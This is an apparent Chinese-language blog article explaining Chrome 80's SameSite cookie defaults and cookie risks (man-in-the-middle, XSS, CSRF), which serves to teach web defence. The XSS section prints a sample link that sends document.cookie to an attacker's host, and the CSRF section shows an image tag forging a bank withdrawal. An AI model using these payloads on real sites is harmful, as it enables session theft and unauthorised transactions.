# Google Cookie策略对Web开发的影响

Chrome将从2月的Chrome 80开始执行新的Cookie策略，对未设置“SameSite”的Cookie默认其值为Lax，即三方网站如果使用了该资源，在请求中是不会带上相关的Cookie的；对SameSite设置为None的Cookie，要求必须同时设置Secure，否则拒绝此Cookie。


### SameSite
这是一个用来决定Cookie的可用网站范围的属性。它有三个值：

1. Strict: 仅限于同站请求
1. Lax: 同站请求，或者跨站的GET的会导致页面URL发生变化的导航行为，包括链接、GET的Form提交。比如在 http://www.def.com 网站的页面中嵌入了一个链接 http://www.abc.com ，那么在用户点击此链接时发起的初始请求，会带上http://www.abc.com中设置为Lax的Cookie。而那些设置为Strict的Cookie是不会带上的。这种跨站链接还包括像嵌入到邮件中的链接。
2. None: 没有限制，同站及跨站请求中都会带上，与传统的方式一样。

**在新的Chrome的Privacy Sandbox的策略中：**

1. 如果Cookie未设置SameSite，那把其值默认为Lax。
1. 如果Cookie设置SameSite=None，还需要同时设置Secure，否则此Cookie会被浏览器拒绝。设为Secure之后，其它三方网站对我方网站资源的引用必须使用HTTPS，否则还是不会带上此Cookie，这也要求我方网站必须支持HTTPS。

## 解释

假设有http://www.abc.com和http://www.def.com两个网站，通过之前的某些页面逻辑，浏览器中已经存储了如下Cookie:
```
Set-Cookie: abc1=ok; Domain=abc.com
Set-Cookie: abc2=ok; Domain=www.abc.com
Set-Cookie: abc3=ok; Domain=xyz.abc.com
Set-Cookie: abc4=ok; Domain=abc.com; SameSite=Strict
Set-Cookie: abc5=ok; Domain=abc.com; SameSite=Lax
Set-Cookie: abc6=ok; Domain=abc.com; SameSite=None
Set-Cookie: abc7=ok; Domain=abc.com; SameSite=None; Secure
Set-Cookie: abc8=ok; Domain=xyz.abc.com; SameSite=None
Set-Cookie: abc9=ok; Domain=xyz.abc.com; SameSite=None; Secure

Set-Cookie: def1=ok; Domain=def.com
```

假设当前在http://www.def.com这个网站中：
![](https://pic3.zhimg.com/80/v2-4a00716c99ba7f39a1a4a9fdfc75eee2_720w.jpg)

## 谷歌进行第三方Cookie规则更新的意义

Cookie的不安全主要在三个方面：

### 1. 中间人效应

Cookie的传输将会`经过多个路由器`，它们都将获得Cookie的内容。而Cookie的内容往往标识了登录状态。解决方法便是使用更安全的HTTPS协议进行传输。

### 2. XSS跨站脚本（Cross-Site Scripting）

使用跨站点脚本技术可以窃取cookie。当`网站允许使用javascript操作cookie`的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的cookie信息。例子：

``` html
<a href="#" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>
```

当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果这个网站用户的cookie信息就会被发送到http://abc.com攻击者的服务器。攻击者同样可以拿cookie搞事情。

解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。

### 3. CSRF跨站请求伪造（Cross-Site Request Forgery）

例如，SanShao可能正在浏览其他用户XiaoMing发布消息的聊天论坛。假设XiaoMing制作了一个引用ShanShao银行网站的HTML图像元素，例如:

``` html
<img src = "http://www.bank.com/withdraw?user=SanShao&amount=999999&for=XiaoMing" >
```
如果SanShao的银行将其认证信息保存在cookie中，并且cookie尚未过期，(当然是没有其他验证身份的东西)，那么SanShao的浏览器尝试加载该图片将使用他的cookie提交提款表单，从而在未经SanShao批准的情况下授权交易。

这是利用网站漏洞和`用户未登出`第三方网站进行的攻击。在SameSite问世之前，我们可用通过HTTP头中的Referer字段进行校验。

### 补充：广告商Cookie应用案例

通常cookie的域和浏览器地址的域匹配，这被称为第一方cookie。那么**第三方cookie就是cookie的域和地址栏中的域不匹配**，这种cookie通常被用在第三方广告网站。为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，给用户推送相关的广告。

更多：https://zhuanlan.zhihu.com/p/31852168

## 参考

* https://zhuanlan.zhihu.com/p/103420328
* https://zhuanlan.zhihu.com/p/31852168
* https://maxket.com/chrome-samesite-none-update/